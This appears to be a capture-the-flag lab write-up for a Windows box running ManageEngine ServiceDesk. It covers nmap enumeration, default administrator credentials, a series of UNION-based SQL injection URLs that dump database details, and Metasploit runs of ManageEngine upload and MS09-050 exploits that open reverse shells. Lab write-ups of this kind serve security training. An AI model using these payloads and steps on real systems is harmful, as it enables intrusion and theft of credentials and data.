# Helpdesk
## Table of Contents
* [Summary](#summary)
* [Enumerate](#enumerate)
  * [Ports](#ports)
  * [Services](#services)
    * [RPC](#rpc)
    * [NetBIOS](#netbios)
    * [SMB](#smb)
    * [RDP](#rdp)
* [Exploit](#exploit)
  * [Metasploit](#metasploit)
* [Explore](#explore)
* [Escalate](#escalate)
* [Effect](#effect)

## Summary
* Hostname: HELPDESK
* IP address: 192.168.107.43
* MAC address: 00:50:56:bf:f2:74 (ref: nbtscan)
* Domain: 
* TCP Ports and Services
  * 135
    * MSRPC
  * 139
    * NetBIOS
  * 445
    * SMB
  * 3389
    * RDP
  * 8080
    * MySQL 4.1.18-pro-nt (ref: SQL injection)
    * Tomcat 5.0.28
    * JBoss 3.2.6
    * ManageEngine 7.6.0
* OS
  * Distro: Windows Server 2008 SP1 (ref: rdesktop)
  * Kernel: (ref:)
* Users (ref: Home > Scheduler > Groups, Technicians; Admin > Technicians)
  * administrator
  * guest
  * Jeniffer Doe (hardware, network, printers)
  * Kevin Yang (hardware, network)
  * Howard Stern (network)
  * John Roberts
  * Shawn Adams
* Vulnerabilities
  * EDB-ID-11793: SQL injection (ref: searchsploit)
  * EDB-ID-46431: Arbitrary File Upload (ref: searchsploit)
  * CVE-2014-5301: Arbitrary File Upload (ref: searchsploit)
  * CVE-????-????: (MS17-010)
  * CVE-2009-3103: SMBv2 Command Value Vulnerability (MS09-050)
* Exploits
  * EDB-ID-46431
  * Metasploit `multi/http/manageengine_auth_upload`
* Flag
  * d0b266cfbf574417258f2e135b545975
* Hints
  * RC1 (-3): Enumerate the version of the web application. The exploit requires credentials, but they should not be hard to find.
  * RC2 (-2): Find the version of the operating system. There is an easy exploit for it. 

# Enumerate
```bash
TARGET=192.168.107.43
NAME=helpdesk
mkdir $NAME
mkdir $NAME/exploits
mkdir $NAME/loot
mkdir $NAME/scans
mkdir $NAME/screenshots
sudo save-screenshots-here $NAME/screenshots
cd $NAME
```

## Ports
```bash
sudo nmap $TARGET -sS -sU --min-rate 1000 -oN scans/$NAME-nmap-initial
sudo nmap $TARGET -sS -sU -p- --min-rate 1000 -oN scans/$NAME-nmap-complete
sudo nmap $TARGET -sV $(print-open-ports-from-nmap-scan scans/$NAME-nmap-complete) -oN scans/$NAME-nmap-versions

# output
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-20 19:15 EDT
Nmap scan report for 192.168.107.43
Host is up (0.13s latency).

PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Microsoft Windows Server 2008 R2 microsoft-ds (workgroup: WORKGROUP)
3389/tcp open  ms-wbt-server Microsoft Terminal Service
8080/tcp open  http          Apache Tomcat/Coyote JSP engine 1.1
Service Info: Host: HELPDESK; OS: Windows; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_server_2008:r2

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.92 seconds
```

```bash
sudo nmap 192.168.208.43 -sC -oN helpdesk-nmap-scripts

# output
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-21 12:52 EDT
Nmap scan report for 192.168.208.43
Host is up (0.076s latency).
Not shown: 995 filtered ports
PORT     STATE SERVICE
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
8080/tcp open  http-proxy
| http-cookie-flags: 
|   /: 
|     JSESSIONID: 
|_      httponly flag not set
|_http-title: ManageEngine ServiceDesk Plus

Host script results:
|_clock-skew: mean: 2h19m59s, deviation: 4h02m29s, median: 0s
|_nbstat: NetBIOS name: HELPDESK, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:bf:db:0a (VMware)
| smb-os-discovery: 
|   OS: Windows Server (R) 2008 Standard 6001 Service Pack 1 (Windows Server (R) 2008 Standard 6.0)
|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
|   Computer name: HELPDESK
|   NetBIOS computer name: HELPDESK\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-06-21T09:53:03-07:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-06-21T16:53:03
|_  start_date: 2021-06-21T16:04:20

Nmap done: 1 IP address (1 host up) scanned in 47.00 seconds
```

## Services
### HTTP
```bash
dirb http://$TARGET -r -z10 -o scans/$NAME-dirb

# output
NSTR
```
```bash
nikto -h $TARGET -T 2 -Format txt -o scans/$NAME-nikto-misconfig

# output
NSTR
```

### RPC
```bash
rpcclient -U '' $TARGET

# output
Enter WORKGROUP\'s password: 
Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
```

### NetBIOS
```bash
nbtscan $TARGET

# output
Doing NBT name scan for addresses from 192.168.107.43

IP address       NetBIOS Name     Server    User             MAC address      
------------------------------------------------------------------------------
192.168.107.43   HELPDESK         <server>  <unknown>        00:50:56:bf:f2:74
```

### SMB
```bash
smbclient -L $TARGET

# output
Enter WORKGROUP\victor's password: 
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
SMB1 disabled -- no workgroup available
```
```bash
smbmap -H 192.168.107.43

# output
[+] IP: 192.168.107.43:445      Name: 192.168.107.43
```
```bash
sudo nmap 192.168.107.43 -p445 --script smb-vuln-ms17-010 -oN scans/helpdesk-nmap-scripts-smb-vuln-ms17-010

# output
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-20 19:52 EDT
Nmap scan report for 192.168.107.43
Host is up (0.078s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx

Nmap done: 1 IP address (1 host up) scanned in 1.18 seconds
```

### RDP
```bash
sudo nmap 192.168.107.43 -p3389 --script rdp-ntlm-info -oN scans/helpdesk-nmap-scripts-rdp-ntlm-info

# output
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-20 19:36 EDT
Nmap scan report for 192.168.107.43
Host is up (0.075s latency).

PORT     STATE SERVICE
3389/tcp open  ms-wbt-server

Nmap done: 1 IP address (1 host up) scanned in 0.71 seconds
```

# Exploit
```bash
firefox http://192.168.107.43:8080
# administrator:administrator
```

### ManageEngine 7.9 SQL injection
The code below copies the exploit information for a possible vulnerability. The exploit is a SQL injection attack. 
```bash
searchsploit -m 11793
firefox http://192.168.208.43:8080 + SQLi
firefox http://192.168.208.43:8080/images/ + filename_from_SQLi
```

First, I started Burp Suite and configured my browser to sent all web requests to it. Then, I browsed to `http://192.168.208.43:8080/WorkOrder.do?woMode=viewWO&WorkOrder.WORKORDERID=1` and sent the request captured to Repeater. Using Repeater, I replaced the POST request with the SQL queries below. I enumerated the number of columns for the impacted table. 
```bash
/WorkOrder.do?woMode=viewWO&woID=WorkOrder.WORKORDERID=1)%20ORDER%20BY%201/*
# output
# No error

/WorkOrder.do?woMode=viewWO&woID=WorkOrder.WORKORDERID=1)%20ORDER%20BY%2021/*
# output
# Error...meaning there are 20 columns in the impacted table. The exploit uses column 9 to stuff data. 

/WorkOrder.do?woMode=viewWO&woID=WorkOrder.WORKORDERID=1)%20UNION%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20/*
# output (a.k.a junk, use to delineate baseline text from extracted data)
# 1301316242931519120-100Test�������51-11234567811121314151617181920 

# MySQL version
/WorkOrder.do?woMode=viewWO&woID=WorkOrder.WORKORDERID=1)%20UNION%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,concat("---",@@version,"---")%20INTO%20DUMPFILE%20'C:\\ManageEngine\\ServiceDesk\\applications\\extracted\\AdventNetServiceDesk.eear\\AdventNetServiceDeskWC.ear\\AdventNetServiceDesk.war\\images\\version.html'/*
# output
# 4.1.18-pro-nt10

# Database name
/WorkOrder.do?woMode=viewWO&woID=WorkOrder.WORKORDERID=1)%20UNION%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,concat("---",database(),"---")%20INTO%20DUMPFILE%20'C:\\ManageEngine\\ServiceDesk\\applications\\extracted\\AdventNetServiceDesk.eear\\AdventNetServiceDeskWC.ear\\AdventNetServiceDesk.war\\images\\database.html'/*
# output
# servicedesk

# Table names
/WorkOrder.do?woMode=viewWO&woID=WorkOrder.WORKORDERID=1)%20UNION%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,concat("---",(SHOW%20tables),"---")%20FROM%20information_schema.columns%20INTO%20DUMPFILE%20'C:\\ManageEngine\\ServiceDesk\\applications\\extracted\\AdventNetServiceDesk.eear\\AdventNetServiceDeskWC.ear\\AdventNetServiceDesk.war\\images\\tables.html'/*
# output
# 


# User name
/WorkOrder.do?woMode=viewWO&woID=WorkOrder.WORKORDERID=1)%20UNION%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,concat("---",user,"---")%20FROM%20mysql.user%20INTO%20DUMPFILE%20'C:\\ManageEngine\\ServiceDesk\\applications\\extracted\\AdventNetServiceDesk.eear\\AdventNetServiceDeskWC.ear\\AdventNetServiceDesk.war\\images\\user.html'/*
# output
# root

# Password
/WorkOrder.do?woMode=viewWO&woID=WorkOrder.WORKORDERID=1)%20UNION%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,concat("---",password,"---")%20FROM%20mysql.user%20INTO%20DUMPFILE%20'C:\\ManageEngine\\ServiceDesk\\applications\\extracted\\AdventNetServiceDesk.eear\\AdventNetServiceDeskWC.ear\\AdventNetServiceDesk.war\\images\\password.html'/*
# output
# (none)
```

### EternalBlue
Downloading the exploit.
```bash
wget https://github.com/worawit/MS17-010.git
cd MS17-010
pip install impacket
```

Checking if the target is vulnerable - it is, but Windows Vista+ does not allow anonymous users to access Named Pipes. 
```bash
python checker.py 192.168.107.43

# output
Target OS: Windows Server (R) 2008 Standard 6001 Service Pack 1
The target is not patched

=== Testing named pipes ===
spoolss: STATUS_ACCESS_DENIED
samr: STATUS_ACCESS_DENIED
netlogon: STATUS_ACCESS_DENIED
lsarpc: STATUS_ACCESS_DENIED
browser: STATUS_OBJECT_NAME_NOT_FOUND
```

### Metasploit
multi/http/manageengine_auth_upload
```bash
msfconsole
search manageengine 7
use multi/http/manageengine_auth_upload
set USERNAME administrator
set PASSWORD administrator
set RHOST 192.168.54.43
set LHOST tun0
run
shell
whoami
cd C:\Users\Administrator\Desktop\
type proof.txt
```

exploit/windows/smb/ms09_050_smb2_negotiate_func_index
```bash
msfconsole
search ms09_050 # target was running Server 2008 SP1 32-bit
use exploit/windows/smb/ms09_050_smb2_negotiate_func_index
set RHOST 192.168.54.43
set LHOST tun0
run # and wait 180 seconds
shell
whoami
cd C:\Users\Administrator\Desktop\
type proof.txt
```

# Explore

# Escalate

# Effect
